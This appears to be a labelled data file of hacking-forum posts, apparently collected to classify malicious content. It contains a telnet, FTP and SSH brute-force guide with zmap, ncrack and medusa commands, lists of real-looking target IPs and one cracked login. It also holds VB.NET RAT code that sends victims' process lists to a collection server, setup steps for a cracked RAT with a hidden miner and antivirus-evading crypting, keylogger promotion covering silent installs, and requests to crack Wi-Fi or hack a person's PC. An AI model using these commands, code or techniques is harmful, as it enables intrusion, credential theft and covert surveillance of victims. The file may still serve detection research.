0	CYLARS | How to Find and Crack Telnets + FTP + SSH	"""   Cracking made easy Hello and welcome to a easy way of finding Telnets, FTP, Ssh Addresses and crack there passwords. Okay first things first this is very easy method to do. I will make it as easy as i can for the scrub masters. Okay before we begin we are going to need a few programs. 1) zmap     2) ncrack Them are the tools we are going to be using. Okay first off we need to find ip ranges. And with zmap this is really simple. So lets start running a mass scan. Code: zmap -p 23 > ip_telnets.txt Photo  Now press CTRL-C when you had enough scanning. cat the ip_telnets.txt file you created. This should contain all the ip ranges for telnet. Now test if its up by simply fping <ip> or just telnet into it like so. Now once you find one that is up its time to start bruteforcing. Okay we are going to be using ncrack for this You can use others but this guide will be on ncrack. Okay so copy the ip address. And make sure you have a wordlists. I will leave a download link to a wordlist below. So lets attack :P. Make sure you use threads as sometimes to much threads can. Dos and alert admin. So time is paintence we wont to be ninja. Okay so the command to use is. Code: ncrack -p telnet -U /root/crack/usernames.txt -P /root/crack/usernames.txt  -T3 125.141.29.158 You can also resume it after you hit CTRL-C it will display the output file location As you can see. Saved current session state at: /root/.ncrack/restore.2015-12-07_05-24 So if you decide to come back to it. Just run.  Code: ncrack --resume /root/.ncrack/restore.2015-12-07_24 Generally speaking if your ip gets traced your screwed so if you wanted. To make this more secure to attack run this Code: proxychains ncrack -p telnet -U /root/crack/test -P /root/crack/test -T sneaky -f <ip>   Id reccommend using torify also.  But for now this should do you can also do a mass bruteforce. Using lists of ip addresss unless you have enough GPUz you cant. Hope you liked this easy tutorial.  Here is one i cracked today using this method. Code: 218.211.65.243 User: admin passw: 1234 And another using hydra.  Please let me know if you would like to learn more things or more advanced hacking. Tactics. Wordlist download:  https://raw.githubusercontent.com/Pr0x13...rdlist.txt   You can just wget the link into a directory.  Also here is a list of ip_ranges for you.  Code: 158.123.106.83 186.46.41.145 31.149.185.240 184.201.173.156 92.37.218.13 80.148.228.136 183.53.144.68 60.9.20.204 186.208.149.90 177.69.109.18 190.56.166.29 75.105.137.54 112.252.246.172 201.222.1.33 106.251.75.153 60.213.89.140 77.228.246.74 171.97.76.246 110.52.131.196 191.178.81.218 31.7.48.30 85.115.239.94 36.55.127.178 183.64.63.53 119.52.175.101 221.224.55.237 136.227.156.150 209.239.26.116 107.41.79.10 85.3.8.217 106.248.166.118 218.90.199.226 5.148.54.215 74.50.35.105 107.41.74.248 91.150.78.247 93.162.195.18 186.27.211.153 186.204.231.233 120.193.138.214 182.70.53.189 42.225.244.191 208.157.181.155 103.239.87.163 24.239.210.97 211.172.142.187 219.144.121.1 90.14.138.181 195.99.161.14 91.130.251.98 173.240.134.115 60.15.175.243 172.193.20.170 58.151.134.2 122.163.210.27 113.175.102.158 115.58.56.197 216.81.107.69 125.97.194.208 2.113.118.70 112.238.224.71 221.41.79.251 23.245.217.138 79.163.65.27 218.211.65.243 117.217.227.19 125.141.29.158 184.238.197.52 112.146.131.98 You can run a huge massive bruteforce with medusa using ip ranges in text file. The command to use is Code: medusa -H ip_telnets.txt -u admin -P /root/crack/usernames.txt  -M telnet Put all them ip ranges in a text file. And run it for a massive bruteforce attack.   """

After this point Im having 2 big problems: 1 - trying to bypass an internet hotspot login page  2 - cracking wpa2 password. First of all i want to say that im on a place where they have: * one hidden open network (which i know the name of) where you have to enter your first name/last name/cabin number/password to login,then buy an internet plan (which is time dependent,pay per hours) and  then decide or not to connect to the internet. So basically everyone that wants to use internet has to login first and then on the next page click on CONNECT to be able to use internet,then its when the counter starts. * Then they also have another hidden network (which i know the name of) but encrypted wpa2. * And many routers around the place to repeat the signal and allow people to connect wirelessly everywhere. BYPASSING THE LOGIN PAGE So,first of all what i tried to do was trying to bypass the login page doing this:  – open terminal in kali linux and type: * Ifconfig (to see my wifi adapter wich in my case was wlan0) – then type in order: * ifconfig wlan0 down * Iwconfig wlan0 mode monitor * Ifconfig wlan0 up  (I did this way to enter the monitor mode because for some reason when i typed: airmon-ng wlan0 and then airodump-ng wlan0 didnt work) – Then i typed: * iwconfig (and i could see the wlan0 that was in mode:monitor)  – Then i run the command to monitor the network around me: * airodump-ng wlan0  And now it showed me many network around me (see pictures below) *i just blured the mac addresses for privacy reason* As you can see in the photos some of the network shows the ESSID (name of the network) but most of the others dont and they show <lengh:  1> (which i have no idea what they are). After few minutes the monitoring finishes and at the bottom of the page appears this: PROBLEM 1: As you can see  it doesnt show any string details,nothing, and i dont know why! i cant even proceed to copy one of the MAC addresses of the devices connected to it and spoof it to my MAC address to be able to bypass the login to use free internet because as i said there is nothing in there. CAN ANYONE GIVE ME SOME HELP ON THIS? Ps: DO YOU THINK IS POSSIBLE TO BYPASS THIS KIND OF LOGIN PAGE TO USE FREE INTERNET? CRACKING THE WPA2 PASSWORD PROBLEM 2:  I wanted to try to crack one of the network on the list that has wpa2 encryption. After the list has shown up (see above) no strings appeared at the bottom page (which is a problem as i already mentioned before). Said so,i tried to open a new page to check if the networks that i wanted to attack was using WPS protocol and typed: * wash -i wlan0 (and this is what it showed me) As you can see it says repeatedly \""found packet with bad FCS, skipping..\"" And in this way i cant even proceed to crack the wpa2 network.

1	How to make a content look suspicious?	""" Sometimes it would be nice to fool antivirus software to detect a particular content file as a virus although it is a perfectly legal file. Has somebody done this? I thought to attach parts of a well known virus file to the end of (or inside) an innocent file, make a few of these, and test them in novirusthanks or similar services. Antivirus programs have learning abilities, and finally I would expect them to start to recognize the whole file as suspicious. But does this work? """
0	Collecting Info On A Victim VBasic Programming	""" First let me say Im not good at writing tutorials. That being said I will try my best. Im writing this for people who have little programming experience, and trying to show how easy it is to do some things that can benefit you in your hacking journey. Not to mention Im currently writing my own RAT and some of the code in my RAT is going to be in this tutorial. Simply this all RATs will have the features I will be showing in this tutorial and these features are very easy to program.  Before we get started you should have a Windows system with the .Net Framework 3.5 or higher. If Im not mistaken Windows 7 ships with the .Net Framework 3.5. It is also recommended you install Visual Basic or Visual Studio. I used the VS 2012. You may also be interested in trying the Open Source alternative to VS called SharpDev Once you have the requirements installed please feel free to read on in this tutorial.  We want to be able to collect information from a person who downloads our RAT. We will call this RAT in this tutorial Lame Ass Boring RAT That Gets Info But Doesnt Control Much Of Anything. Okay its a long name but it pretty much sums up will be done in this tutorial.  First start VB .Net up. Then create a new console based project. Not a Windows Form project. Now we will make our RAT show running processes. To do this we will type the following.  Imports System.Diagnostics Module rat     Sub Main()         Dim psList() As Process         psList = Process.GetProcesses()         Console.WriteLine(\""Process Name: \"" + p.ProcessName + \"" PID: \"" + p.Id.ToString())     End Sub End Module Now lets run the program. You should just see one process listed. This is because it fetches just one process. To fetch all running processes we will use a loop and loop threw all the processes. In our case it will be best to use For Loop. So we modify our code to look like the following.  Imports System.Diagnostics Module rat     Sub Main()         Dim psList() As Process             psList = Process.GetProcesses()             For Each p As Process In psList                   Console.WriteLine(\""Process Name: \"" + p.ProcessName + \"" PID: \"" + p.Id.ToString())             Next p     End Sub End Module Now when we run the program. We will see all the processes. Of course theres always a chance of it not always working out that way. And in those cases we should now how to handle such things. We will add a Try Catch statement. Which will try it and if it doesnt work it will catch the error and spit out a friendly message. Our code will now look like the following.  Imports System.Diagnostics Module rat     Sub Main()         Dim psList() As Process         Try             psList = Process.GetProcesses()             For Each p As Process In psList                   Console.WriteLine(\""Process Name: \"" + p.ProcessName + \"" PID: \"" + p.Id.ToString())             Next p         Catch ex As Exception             Console.WriteLine(ex.Message)         End Try     End Sub End Module Now currently this program will only show the results on the computer it is running on. This doesnt do much for us. Well there are many ways to get this data to us. We could make the program act as a reverse server, we can have it post the output to a PHP script, we could have it upload via FTP or SSH. We could have it email us. The method you choose is entirely up to you. In the following example I will have it post to PHP script. Think Loki RAT. To do this we will use WebRequest, honestly I think Microsucks hates me, they make this so god damn tedius so I use a function to make it easier. The function looks like the following.      Function WRequest(URL As String, method As String, POSTdata As String) As String         Dim responseData As String = \""\""         Try             Dim cookieJar As New Net.CookieContainer()             Dim hwrequest As Net.HttpWebRequest = Net.Webrequest.Create(URL)             hwrequest.CookieContainer = cookieJar             hwrequest.Accept = \""*/*\""             hwrequest.AllowAutoRedirect = True             hwrequest.UserAgent = \""http_requester/0.1\""             hwrequest.Timeout = 60000             hwrequest.Method = method             If hwrequest.Method = \""POST\"" Then                 hwrequest.UserAgent = \""Virus\""                 hwrequest.ContentType = \""application/x-www-form-urlencoded\""                 Dim encoding As New Text.ASCIIEncoding() Use UTF8Encoding for XML requests                 Dim postByteArray() As Byte = encoding.GetBytes(POSTdata)                 hwrequest.ContentLength = postByteArray.Length                 Dim postStream As IO.Stream = hwrequest.GetRequestStream()                 postStream.Write(postByteArray, 0, postByteArray.Length)                 postStream.Close()             End If             Dim hwresponse As Net.HttpWebResponse = hwrequest.GetResponse()             If hwresponse.StatusCode = Net.HttpStatusCode.OK Then                 Dim responseStream As IO.StreamReader = _                   New IO.StreamReader(hwresponse.GetResponseStream())                 responseData = responseStream.ReadToEnd()             End If             hwresponse.Close()         Catch e As Exception             responseData = \""An error occurred: \"" & e.Message         End Try         Return responseData     End Function We then just change our for loop to look like the following.  WRequest(\""http://website.com/?\"", \""POST\"", \""prname=\"" & p.ProcessName & \""&pid=\"" & p.Id.ToString()) We also will import some libraries at the top of our code.  Imports System.Net Imports System.Web So our full code will look like the following.  Imports System.Net Imports System.Web Imports System.Diagnostics Module rat     Function WRequest(URL As String, method As String, POSTdata As String) As String         Dim responseData As String = \""\""         Try             Dim cookieJar As New Net.CookieContainer()             Dim hwrequest As Net.HttpWebRequest = Net.Webrequest.Create(URL)             hwrequest.CookieContainer = cookieJar             hwrequest.Accept = \""*/*\""             hwrequest.AllowAutoRedirect = True             hwrequest.UserAgent = \""http_requester/0.1\""             hwrequest.Timeout = 60000             hwrequest.Method = method             If hwrequest.Method = \""POST\"" Then                 hwrequest.UserAgent = \""Virus\""                 hwrequest.ContentType = \""application/x-www-form-urlencoded\""                 Dim encoding As New Text.ASCIIEncoding() Use UTF8Encoding for XML requests                 Dim postByteArray() As Byte = encoding.GetBytes(POSTdata)                 hwrequest.ContentLength = postByteArray.Length                 Dim postStream As IO.Stream = hwrequest.GetRequestStream()                 postStream.Write(postByteArray, 0, postByteArray.Length)                 postStream.Close()             End If             Dim hwresponse As Net.HttpWebResponse = hwrequest.GetResponse()             If hwresponse.StatusCode = Net.HttpStatusCode.OK Then                 Dim responseStream As IO.StreamReader = _                   New IO.StreamReader(hwresponse.GetResponseStream())                 responseData = responseStream.ReadToEnd()             End If             hwresponse.Close()         Catch e As Exception             responseData = \""An error occurred: \"" & e.Message         End Try         Return responseData     End Function     Sub Main()         Dim psList() As Process         Try             psList = Process.GetProcesses()             For Each p As Process In psList                   WRequest(\""http://website.com/?\"", \""POST\"", \""prname=\"" & p.ProcessName & \""&pid=\"" & p.Id.ToString())             Next p         Catch ex As Exception             Console.WriteLine(ex.Message)         End Try     End Sub End Module So the stub is all finished. Now we just need to work on the php. The PHP script we will build will use MySQL to store data from our victims computer.Please keep in mind the code isnt safe from MySQL injection attacks. It is just an example.  <?php     DEFINE(DATABASE_USER, user);     DEFINE(DATABASE_PASSWORD, virus);     DEFINE(DATABASE_HOST, localhost);      DEFINE(DATABASE_NAME, dbname);     $con = @mysqli_connect(DATABASE_HOST, DATABASE_USER, DATABASE_PASSWORD,     DATABASE_NAME);     if (!$con)      {        trigger_error(Could not connect to MySQL:  . mysqli_connect_error());     }     $pname = trim($_POST[pname]);     $pname = htmlentities(mysqli_real_escape_string($con,$pname));     $pid = trim($_POST[pid]);     $pid = htmlentities(mysqli_real_escape_string($con,$pid));         mysqli_query($con,\""INSERT INTO processes (`processname`,`pid`) VALUES ($pname,$pid)\""); ?> Now of course if traffic comes to the site our database will get filled with a bunch of blank info. Plus we have no way of identifying our infected system. So we need to modify our PHP script. First we will identify our infected PC, by getting the IP address. So our following PHP code will look like the below.  <?php     DEFINE(DATABASE_USER, user);     DEFINE(DATABASE_PASSWORD, virus);     DEFINE(DATABASE_HOST, localhost);      DEFINE(DATABASE_NAME, dbname);     $con = @mysqli_connect(DATABASE_HOST, DATABASE_USER, DATABASE_PASSWORD,     DATABASE_NAME);     if (!$con)      {        trigger_error(Could not connect to MySQL:  . mysqli_connect_error());     }          $ip = trim($_SERVER[REMOTE_ADDR]);     $ip = htmlentities(mysqli_real_escape_string($con,$exip));     $pname = trim($_POST[pname]);     $pname = htmlentities(mysqli_real_escape_string($con,$pname));     $pid = trim($_POST[pid]);     $pid = htmlentities(mysqli_real_escape_string($con,$pid));         mysqli_query($con,\""INSERT INTO processes (`ip`,`processname`,`pid`) VALUES ($ip,$pname,$pid)\""); ?> Of course this just gives us a better way of getting the victims information and if we are getting a bunch of victims it allows us to identify each one better. It doesnt stop the people from visitting the PHP script without the virus. This is why we added the hwrequest.UserAgent = \""Virus\"" part in our VB function. We created unique useragent that we can now identify with our PHP script like so.  <?php if ($_SERVER[HTTP_USER_AGENT] != \""Virus\"") {     echo \""Wrong\""; } else if ($_SERVER[HTTP_USER_AGENT] == \""Virus\"") {     DEFINE(DATABASE_USER, user);     DEFINE(DATABASE_PASSWORD, virus);     DEFINE(DATABASE_HOST, localhost);      DEFINE(DATABASE_NAME, dbname);     $con = @mysqli_connect(DATABASE_HOST, DATABASE_USER, DATABASE_PASSWORD,     DATABASE_NAME);     if (!$con)      {        trigger_error(Could not connect to MySQL:  . mysqli_connect_error());     }     $ip = trim($_SERVER[REMOTE_ADDR]);     $ip = htmlentities(mysqli_real_escape_string($con,$exip));     $pname = trim($_POST[pname]);     $pname = htmlentities(mysqli_real_escape_string($con,$pname));     $pid = trim($_POST[pid]);     $pid = htmlentities(mysqli_real_escape_string($con,$pid));         mysqli_query($con,\""INSERT INTO processes (`ip`,`processname`,`pid`) VALUES ($ip,$pname,$pid)\""); } ?> Obtaining the running processes on the users computer can give us a bit of info such as what AV they are using. And what programs are running. If we know a program that is running uses a port that is vulnerble to exploits that becomes a plus. If we know the program itself is vulnerble once again that is a plus. """

1	Hello, Need Help With Something Unbelivable, But With a Huge Pay-off	""" Hello Hackers of this grand forum. How’re you guys?  I have a complicated problem, or task, so to say, and I badly require some help. It would greatly benefit anyone involved who helps, but you may find it a little hard to believe. Hackers I’d assume are skeptical people, and rightly so, so it may be difficult to convince you guys as to what we’re dealing with here. It is indeed something truly rare. I’d say even unbelievable.  I’ll explain. When I was a kid, I had a friend, who later in life became very, very bad, mean, and all out cruel. His dad was a military sniper, who later worked for the police, and at an early age my old friend would develop highly advanced, but deadly thoughts. It started with things that were like asking one of the worst things a criminal did to be taken in, and after he was taken in, he would tell someone out on the street to go and to it, as that was not illegal from his end. As he got older, he learned to do some very brutal things, such as…well, not sure if I can share, but getting rid of people, and putting them so high up in the forest that literally there was nothing that could be done, or recognized. This is one brutal dude.  Sometime, in his pre-teen years, he learned how to do the most extreme computer codes I, or probably mostly anyone here has ever seen. He can make any trend he wants, and get it trending on face book, or wherever. Even Fox News or CNN. It takes pages, and there is a lot of text I’m unable to understand, I won’t go into it here. He can, for example, get them to move a comma at NASA, and literally make big stuff blow up. It’s insane. I know this is sounding pretty unbelievable. It is, I know. But please believe me, I am not making this up. I can even show some of his victims, but would rather not…it’s pretty bad. Unethical, to say the least. Alright, so, basically, these trends he makes, can do almost anything. I mean, they can do a lot, and somehow, completely legally. For example, he could get cash delivered to a said place, and it would be rightly yours, etc. I know it’s far fetched.  Plus, I would rather do nothing than take advantage of good people. And I certainly don’t want to hurt anyone, or get anyone hurt here. That being said. I was wondering, is there anyone who would be up to hacking into his PC, lifting this document, or said documents out, that he has saved, and then, well, basically keeping them. I would like one for myself, I know I can’t do any of the real work, but I can provide you his location, etc, and am the one who thought of it. One time, back in 05, I had these very documents, and could do loads of things, make mine and people around me lives easier, but I ended up deleting them on request from my friend, who thought they were too easy, or something, and at that time I agreed, not because I was doing bad, but because it was impossible to speak of these things, they are so unbelievable.  So basically what I’m asking is can anyone hack into his PC, get these out, give me a copy, and basically go on all our merry ways? I can’t figure out a way to do it, other than this. So, before you say no, please know you guys are my last effort and hope, and there is remarkable things we could do. Charities, feeding homeless, personal wealth, etc…as well as getting anything to trend that we desire. Okay. So. Enough about that far fetched stuff. Is there anyone out there who would be willing to help me. You can basically take your fee out of that. I just really need a copy myself, so if you agree to that--let’s do it. Thanks. One last time. Can anyone agree to hacking into this person’s PC and lift these docs out? I really need them, and they will be well worth the effort. Okay. Take care. Thanks for your time. """

Details Of XSS Malicious Attack Cross-Site Scripting Xss Attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted web sites. Xss attacks occur when an attacker uses a web application to send malicious code generally in the form of a browser side script to a different end user.Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. An attacker can use Xss to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted and will execute the script. Because it thinks the script came from a trusted source the malicious script can access any cookies session tokens or other sensitive information retained by the browser and used with that site.

0	How to create an interactive ebook	"""   Id like to share my experience of using a free software to create ebooks, and describe the steps I followed to achieve that. One of the great things about this software is the ability to add interactive objects inside your ebook. Although its a free software, no ads appear in your ebook, and you can actually replace the Kotobee logo with your own! The software Im using to create ebooks is called Kotobee Author. Hope you enjoy this tutorial. How to create an interactive ebook Download  Kotobee Author  from their websites  Downloads & Pricing  page here:  www.kotobee.com/pricing . Choose your operating system:  Windows 32-bit ,  64-bit , or  Mac OS . The download will start immediately. Run the installer and follow the instructions as needed. To start creating ebooks, open  Kotobee Author . Note it may take a while to open at the first run. You will see an editor similar to Microsoft Word where you can start writing the content of your book, using standard text formatting tools. There is an initial chapter created for you by default but you can add more chapters anytime. You can also add subchapters to any chapter by clicking on the + button next to it. Once youve entered a substantial amount of text, its time to add some images. Drag and drop images into the editor, or add them using the  Image  tool from the toolbox on the right. A popup will appear giving you several options to choose from (i.e. dimensions, text-wrapping, etc). I wont go into all the details, but Id like to particularly mention the animation options. Below the  Animation on click  label, you will be able to choose the kind of animation that happens once the user clicks on the image. You can make the image wiggle, jump, or scale in and out. You can also make the image open in a popup window once clicked. Simple to create, and appealing to the user. Since youre working inside the editor, interactive components wont display their interaction. You need to go into preview mode to do that. Click on  Preview Mode  at the bottom right. Click on the image and see the image animating as you specified. As another example, lets add a YouTube video. Click on the  Video  tool button. Paste the URL of the YouTube video, and click on  Create . Its as simple as that! Enter preview mode to see the video in action. One of the impressive things worth looking into are ebook widgets. They are like mini-apps you put inside your ebook, that open in a popup once clicked by your users. There are like thousands of widgets available online for download (free and commercial). Two popular widget providers I like are  http://www.bookry.com  and  http://www.bookwidgets.com . Sign up for a free account, and download any of their free widgets. The widget file is basically a zip file format. Click on the  Widget  tool button and browse to the widget file. Enter preview mode again, and check out the widget in action. This is an example of a calculator widget: Now that the ebook has enough content, its time to export it. But before doing that, lets customize the interface, and choose the components wed like available in the ebook. Click on the  Customize  tab at the top. From the left panel, you have many design options to choose from. You can add your own logo, startup image, header colors, and endless other options. You can also choose the components youd like in your ebook, such as search, google lookup, text-to-speech, and others. You can also specify the default language for the interface. Nows a good time to preview your entire ebook. You can preview it on different devices (e.g. iPad, iPhone, Samsung Galaxy Tab, Nexus, etc). The different devices are available from the  Platform  list. Click on the  Components  tab. Now to publish your ebook. Click the Export tab. Youll find a list of different export formats that are supported, such as web apps (HTML5), desktop apps (Windows and Mac), Android apps, iOS apps (iPad & iPhone), LMS SCORM components, etc. Im assuming that youre interested in publishing a web app of your ebook, and hosting it on a server via FTP. Click on  Export Web Applications , and then on  Enter serial number.. . The login dialog box will appear. Click on  Register a free serial number . You will be required to fill a registration form. A free serial number will be emailed to you. Simply enter it into the same dialog box, and you will be able to export the Web app. Select the destination folder to save the files. If you enter the folder, you will find that they contain various HTML, JS, and CSS files. Upload these files to your server and simply enter the URL in the browser to see your ebook in action. Hope you found that easy! Theres an online user guide available for  Kotobee Author  that can guide you step by step:  http://support.kotobee.com . Let me know if that tutorial was useful for you!   """
1	priv8 Imminent Monitor 3 | The Fastest RAT | Miner | Reverse Proxy	"""   priv8 Imminent Monitor 3 | The Fastest RAT | Miner | Reverse Proxy                           Imminent Monitor added a new feature in v3. This new feature being the Crypto Miner. This can be used to force your bots to mine Bitcoin, Litecoin, and many other online currencies. This feature is awesome because now you no longer have to make/buy a silent miner.     Imminent.Monitor.3.9.0.0-Crack-amiros   download here   1. Once on the home screen of Imminent Monitor, click on the Builder tab.   2. In the box next to IP/DNS, enter your No-IP Hostname.  3. In the box next to Port, enter the port that you Port Forwarded in your router.  4. Put the Server ID as anything you want. Wave your mouse over the characters in the mutex for a few seconds.   5. Go to the Installation tab.    Here, you can add the server to startup. This means it will run every time the client turns on their computer. I recommend that you use HKCU and not the other options because then it does not matter if the client is an administrator or not. At the top, you can pick where to install the file to. I recommend that you do not pick Temp as the files in the temp folder are not needed and people use tools like CCleaner a lot to clear the Temp folder. You can call the file and folder whatever you want, but if you want it to keep more hidden, I recommend that you use a name that looks legit and people wouldnt deem suspicious. 6. Go to the Protector Settings tab.   Here I recommend that you keep everything as it is. If you disable Task Manager, people will become suspicious really quick so I would not recommend it. Registry Persistance and Attempt BSOD on kill can sometimes not work and sometimes mess up the file a little from my experience so I wouldnt recommend them. 7. Go to the Assembly Settings tab. I recommend that you just click generate until you find something good that looks legit. Also, a good thing to do is to sometimes get the title of a generated assembly and then use it as the folder and file name in the installation tab for it to look more legit. 8. Go to the Final Build Settings tab. If you would like to give the file an icon, select Enable Icon Changer and browse for the icon you want. It must be a .ico file. If you want to keep the settings saved so you do not have to type them in again if you want them again, tick Save Settings. If you want the file to be crypted so that it is not detected by Anti-VIruses, select Crypt File (FUD). 9. Go out of the builder and click on Settings. Here, add your Port Forwarded port and start listening. Then whenever someone runs your file, you will get them in the Clients section of your RAT. 10. After the last step, you can upload your file to a website for people to download. You can also upload it on a virus scanning website if you want to see what the detection rate is. Then you are done!   Hi guys, so as the title says this Tutorial will be about how to setup the miner in Imminent Monitor 3. I feel that this tutorial is necessary because many customers dont know how to use it in the recent update. I think it would be a great addition to the many Imminent Monitor tutorials and I think Shockwave would find this tutorial very helpful to both him and you guys as it takes a lot of load off of him and also shows you guys the customers how to use it. First start by Right Clicking on your client, and then selecting Crypto Miner. You will be presented with this new window. Now Select your client and click the \""New Miner\"" button, located at the bottom right hand corner of the window and you will be presented with yet another window. In this window you put your miner and pool details, like so. (Its important that you dont forget the \""stratum+tcp://\"" otherwise this wont work) Once done click Start mining, youll notice that the status of the miner will say \""Downloading Files\"" this is because Imminent Monitor 3 doesnt come with the miner files in the stub which is good because otherwise the stub would be big. When its finished downloading youll see that it has started from the status tab. We can verify its working by looking at the GPU Temperature in a program like Speccy, and if done in Sandboxie the process \""vbc.exe\"" will start and will tell you the stats in a cmd window. Usually most coin sites take up to an hour to update your miner statistics so if your stats arent shown on the website straight away dont panic, verify everything is working by testing it in Sandboxie.   this is a cracked version i will not provide any support of any kind  this crack i found on underground forums and am not held liable for what you do with this      Imminent.Monitor.3.9.0.0-Crack-amiros   download here   """

But since it doesn’t protect your FTP credentials, you should protect them yourselves. Here is what you can do: 1. Don’t use the “Normal” logon type. There are the “Ask for password” and the “Interactive” types that won’t save your passwords on disk. So malware simply won’t be able to get enough information from FileZilla configuration files to hack your sites. Pros Malware cannot steal your FTP credential from configuration files. Cons You’ll have to enter your password every time you connect to your site. It won’t save you from more sophisticated spyware such as keyloggers and traffic sniffers. But I hope this sort of trojans can be better detected by you antivirus tools since they need to hook known system functions. To protect yourself from traffic sniffers, always use SFTP instead of FTP (if possible). 2. Hosts trick.  If you manage multiple web sites, interactive logon types may be really inconvenient. There is a trick that can let you use the “Normal” logon type in a more secure manner. You should create aliases of your sites’ addresses in the “hosts” file (on Windows, you can find it in  C:\\WINDOWS\\system32\\drivers\\etc\\ ). For example you have a site “example.com” with an IP-address \""208.xxx.188.166\"". To create an alias you need to add the following line into the hosts file: 208.xxx.188.166         my_example \""my_example\""  will work the same way as “example.com” when you use it on your computer. However, on other computers it won’t make any sense. Now use this alias in  Hidden Content:  You must reply to see links  connection settings instead of “example.com”.  If hackers manage to steal your FTP credentials, all they’ll have will be: ( host: my_example, user: unmask, password: parasites ) – the username/password pair is valid, but the host name doesn’t make any sense to them. It’s like having a key and not knowing where the door is. Pros Once you have added new aliases to the hosts file and to FileZilla Site Manager, you can enjoy the ease of one-click connections. Cons This trick will only work as long as malware steals FTP credentials from configuration files verbatim (and I have proofs that at least some malware steal the data verbatim).  If they only add a simple check that converts host names to IP-addresses before sending the credentials to their central database, the trick will be useless.  This trick is better than no protection at all, but you should not count on it. You’ll need to update the hosts file if IP-addresses change. 3. Public Key Authentication.  If your hosting plan included SSH (secure shell), you can use FileZilla in SFTP mode. One of convenient SSH features is public key authentication. And FileZilla supports this type of authorization (I didn’t use it myself, but at least have seen the UI in the “Settings” dialog). FileZilla recognizes PuTTY’s Pageant, so the configuration should be easy if you already use PuTTY for SSH. Pros Secure one-click connections. Cons This authentication method will only work if your hosting plan includes SSH/SFTP. Unfortunately, this option is rearly included into shared hosting plans. Creating the keys and configuring FileZilla to use them is not a trivial process. You might still have to enter a pass phrase when adding keys to the Pageant. Other FTP programs In this article I reviewed FileZilla only because it’s a popular FTP client that I have on my computer and it was very easy to demonstrate how little it does to protect users’ FTP credentials. However the same concerns apply to all other  programs that have FTP functions: classical FTP clients, web page editors, file managers. Popular applications like DreamWeaver, CuteFTP, Total Commander, etc. account for majority of FTP credentials leaks.

This helps you capture Windows logon password and all other typed passwords as well!  � 100% Undetectable  � Invisible to anti-virus software  It�s no secret that anti-virus and anti-spyware applications will constantly try to detect and block even legitimate monitoring applications like Elite Keylogger. Elite Keylogger does a great job hiding its own modules from anti-virus, anti-rootkit and anti-spyware apps. Elite Keylogger ensures its not detected during regular scans and even after you update your anti-virus software. It implements a number of unique algorithms to stay hidden.  � Invisible to other users  Elite Keylogger stays absolutely hidden to other users of the monitored computer. They wont find Elite Keylogger among running processes, in the list of installed applications, in the history of used programs, in the Start Menu, or anywhere else! Guaranteed!  � Rest assured with custom and special recompiled builds  Need to be even more positive that no keylogger detection tool finds your installation of the monitoring software? Rest assured: WideStep recompiles Elite Keylogger every day to randomize all its internal file signatures. Additionally being a registered user, you get access to special builds for clients only. This Elite Keylogger download is not accessible to public, thus it cannot be downloaded and studied by anti-virus vendors.  � Multiple Log Delivery Options  � Get logs delivered to your email  Remote logs can be obtained in many ways. Email is the most popular method. Just enter the email address you would like to get remote logs sent to, and Elite Keylogger will configure the rest of email settings for you.  � Collect remote logs via FTP or network  Elite Keystroke Recorder will secretly send logs from the monitored PC to any FTP server you configure. Its simple and has no limit on the log size that can be sent online. Talk to your hosting provider to find out which FTP settings should be used.  � Secretly grab recorded logs using a USB drive  Whenever you insert a prepared USB drive in the monitored PC, all new logs will be secretly copied there, so you can read them later with the convenient Elite Keylogger Logs Viewer.  � Install It the Way _YOU_ Need  � Remotely...  In addition to the normal local installation, Elite Keylogger can also be deployed.  While Elite Keylogger will always act as a normal Windows installer when being deployed, if you have remote admin rights and can log on remotely to the computer you are going to monitor, you can install Elite Keylogger via Remote Desktop.  In many cases it will be convenient to install it so that the remote user doesnt see the installation process. Read on to find out how this can be accomplished...  � Silently...  Its very easy to create a silent Elite Keylogger installer with pre-configured settings. Heres what you have to do:  � Install Elite Keylogger on your computer  � Unhide it, and configure it the way you need the remote monitored computer to be configured: monitoring schedule, email/FTP settings, etc.  � Go to Options and select \""Export configuration\""  � Point to the original installer of Elite Keylogger that you used to deploy this copy of the software  � Elite Keylogger will attach your current configuration to the installer  Now you can run the modified installer with the \""/s\"" parameter in any computer you would like to monitor. The deployed copy will have all the settings you configured right after the first reboot.  � No Pop-ups!  If you are in the middle of your free trial, you may wonder what to expect when the trial is over. Fear no more: free to try Elite Keylogger WILL NOT display any unexpected pop-ups or other notifications of the trial period being over to your monitored employees or familymembers. It will remind you on the next unhiding.  � Inactivity Detection  Elite Keylogger automatically stops monitoring when there is no user activity. This means no trash in the logs like black screenshots, and no unnecessary PC resource consumption.  � Configurable Nag Screen  If you decided to notify your users that they are being monitored, Elite Keylogger lets you enable a special message screen on user logon. This is extremely convenient for public places that are monitored with Elite Keylogger, such as libraries, classrooms, etc.  � Automatic Uninstallation  Dont want to keep Elite Keylogger for long on the remote PC you are monitoring? No problem: just enable automatic uninstallation when you are deploying Elite Keylogger and it will uninstall itself within the number of days you select.  � Keyword Access  Elite Keylogger is really easy to use. Installation is very familiar and really as simple as 1-2-3. Once the Keylogger is installed, you are presented with the basic instructions on how to unhide it when its hidden. As you know, monitoring starts immediately after you reboot your PC after installation. Now just type one word anywhere in your system and you have the Keylogger unhidden. Theres an additional password for your security.  Download Link:  Hidden Content:  You must reply to see links NOTE : Only Compatible on windows 7 and lower  REP+ me guys    """

But once the one time mabait is finished, a time-memory trade-off cracker can be hundreds of times faster than a brute force cracker, with the help of precomputed tables.

0	Bypassing Anti-Virus with 10 lines of code	""" Bypassing Antivirus With Ten Lines of Code or (Yet Again) Why Antivirus is Largely Useless I had originally set out to write a long winded blog post on different antivirus bypass techniques. I went through what was supposed to be step 1 of my guide and uploaded my resultant binary to virustotal. To my complete and utter shock, the binary got a 0/56 detection rate. I decided to throw out my long winded idea and move forward with this quick, dirty, and unbelievably easy method. I believe that most of my readers would agree with me that bypassing most antivirus based solutions is rather trivial, however I do occasionally bump in to some people who solely rely on tools that generate binaries that can easily be fingerprinted and flagged by antivirus solutions. This article is largely intended for that audience. Before I dive in to this small tidbit of C++ code, Id like to touch on a tool that is really good at producing binaries that almost always evade detection, Veil-Evasion (part of the Veil-Framework). This tool is awesome (many thanks to @harmj0y and others for creating and contributing to this awesome project) and in almost all instances I have had to use it has not let me down. If it has, I blame people who keep generating binaries and then testing them on virustotal. If you people could stop doing that, that would be great. At any rate, this begs the question, if tools like Veil Evasion are so epic, why should you care about 